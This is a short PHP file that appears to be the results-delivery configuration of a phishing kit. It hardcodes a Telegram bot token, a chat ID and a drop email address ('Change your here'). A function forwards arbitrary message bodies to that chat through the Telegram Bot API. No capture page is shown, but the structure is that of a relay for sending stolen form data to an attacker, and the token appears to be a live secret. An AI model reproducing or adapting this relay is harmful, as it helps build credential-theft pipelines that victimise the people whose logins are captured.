<?php
$token = "669686054:AAHVeLJLNo2KuZ_v9pzz_LX457Cw-ZqWbS8";
$to = 'icbaiir@yandex.com'; //Change your here 
$chat_id= "558416097"; // Chat ID here

session_start();
function Telegram($chat_id,$body)
{
    $chat_id = '558416097';
    $token = "669686054:AAHVeLJLNo2KuZ_v9pzz_LX457Cw-ZqWbS8";
    $data = [
        'chat_id' => $chat_id,
        'text' => $body,
        'parse_mode'=>'html'
    ];

    $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
}

?>